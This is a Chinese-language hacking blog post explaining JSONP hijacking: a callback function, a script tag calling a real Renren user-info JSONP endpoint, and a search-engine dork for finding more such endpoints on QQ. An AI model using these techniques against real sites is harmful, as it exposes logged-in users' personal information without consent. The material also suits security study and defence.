---
category:	Hacking
layout:		post
title:		使用JSONP攻击探测目标用户信息
desc:		jsonp攻击已经算是很成熟了，出来了应该很久，但是知道的人也许并不是很多。这个玩意能做什么呢？也许你能让TA发挥更强大！
tags:		[jsonp,xss,xss-jsonp,jsonp攻击,探测信息]
---
#### 科普
如果你是第一次听说这个玩意，可以点击[jsonp-百度百科](http://baike.baidu.com/view/2131174.htm?fr=aladdin)进行大概的了解。    

#### 原理
很多大型的网站，比如百度、QQ、人人、新浪等等社交网站，都存在`jsonp`接口以方便其他页面调用。    
比如要获取当前的登陆用户信息，则需要在本地定义一个接收用户信息的函数，然后再使用`<script>`标签进行跨域地访问`jsonp`接口，`jsonp`返回的数据一般都是`json`格式，也就是`js`可以直接`eval`的代码，然后再把执行成功的`object`返回给用户定义的函数。    
额，这个是个人的简单理解，因人而已，可以不必纠结。。

#### 利用
我们先定义一个我们的接收函数：
[code:javascript:]
function cb(data){
	console.log('[*] 获取到数据..');
	console.log(data);
}
[codend]

然后再添加一个`<script>`标签引用我们扫描到的`jsonp`接口：
[code:xml:]
<script src="http://passport.game.renren.com/user/info?callback=cb"></script>
[codend]
这里注意的是，`URL`中的`callback`参数为我们定义的函数名称。如果不出意外，`js`脚本在执行完毕之后就会执行我们的`cb`函数了。

#### 扩展
综上所述，如果我们需要探测对方的信息，则需要更多的`jsonp`接口来探测，这时候问题就来了，我们如何去扫描`jsonp`接口呢？    
根据一般的`jsonp`地址不难看出有个特性，就是基本都有`callback`参数，那么我们就可以直接使用搜索引擎搜索类如：

	site:qq.com inurl:callback

还可以自己写个插件神马的，浏览一个网站的时候判断所访问的所有`url`地址，然后判断是否为`jsonp`，那效率杠杠的！